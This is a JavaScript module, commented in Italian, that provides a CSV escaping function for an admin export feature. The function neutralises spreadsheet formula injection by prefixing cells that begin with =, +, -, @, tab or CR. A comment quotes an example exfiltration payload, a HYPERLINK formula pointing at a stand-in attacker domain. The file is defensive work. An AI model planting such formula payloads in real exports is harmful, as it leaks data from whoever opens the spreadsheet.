// src/components/admin/adminExport.js
// Download di un blob e escaping CSV: condivisi dal tab Import/Export e dal
// tab Log, che esportano entrambi.
//
// M-3 dell'audit del 14 agosto (secondo passaggio): `downloadFile` era una di
// TRE copie identiche (o quasi — vedi lib/fileUtils.js) dello stesso corpo.
// Resta qui come alias di una riga per non toccare i due call site di questo
// modulo nello stesso commit: l'implementazione unica è `scaricaBlob`.
export { scaricaBlob as downloadFile } from "../../lib/fileUtils.js";

// Excel e LibreOffice valutano come FORMULA ogni cella che inizia con =, +, -,
// @ (o con TAB/CR). L'escaping RFC 4180 qui sotto è corretto ma non c'entra:
// protegge la struttura del CSV, non il foglio che lo aprirà.
//
// Il contenuto esportato è testo scritto da terzi — titoli di task, nomi
// cliente arrivati da un import CSV o da un form — quindi un valore come
// =HYPERLINK("https://evil.tld?d="&A1,"Apri") finisce attivo nel foglio
// dell'amministratore che apre l'export, con la sua rubrica a portata di
// riferimento di cella. L'apice iniziale è il neutralizzatore riconosciuto da
// entrambi i programmi: forza l'interpretazione testuale e non viene mostrato
// nella cella.
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export const escapeCSV = (val) => {
  if (val === null || val === undefined) return "";
  let s = String(val);
  if (FORMULA_TRIGGERS.test(s)) s = `'${s}`;
  if (s.includes(",") || s.includes('"') || s.includes("\n")) return `"${s.replace(/"/g, '""')}"`;
  return s;
};
